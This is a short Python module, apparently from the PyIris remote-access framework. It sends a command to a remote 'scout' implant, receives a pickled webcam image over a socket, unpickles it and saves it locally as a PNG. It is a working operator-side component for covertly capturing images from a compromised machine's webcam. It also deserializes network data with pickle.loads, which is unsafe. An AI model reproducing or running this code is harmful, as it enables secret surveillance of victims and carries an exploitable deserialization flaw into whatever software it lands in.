# API
# done
import os
import pickle
import pyiris_api.library.modules.recv_all as recv_all
import pyiris_api.library.modules.send_all as send_all
from datetime import datetime


def main(self, sock, command):
    send_all.main(sock, command)
    self.log.inf('Waiting for raw webcam pickle to arrive')
    raw_bytes = recv_all.main(sock)
    file_name = datetime.now().strftime('%Y-%m-%d_%H-%M-%S.png')
    if type(raw_bytes) is str:
        self.log.blank(raw_bytes)
        return {"status": "error", "message": "", "data": {"scout_output": raw_bytes}}
    elif type(raw_bytes) is bytes:
        img = pickle.loads(raw_bytes)
        img.save(file_name, 'PNG')
        self.log.pos('Wrote file to : ' + os.path.join(os.getcwd(), file_name))
        self.log.pos('Done')
        return {"status": "ok", "message": "", "data": {"scout_output": '[+]Wrote file to : ' + os.path.join(os.getcwd(), file_name)}}
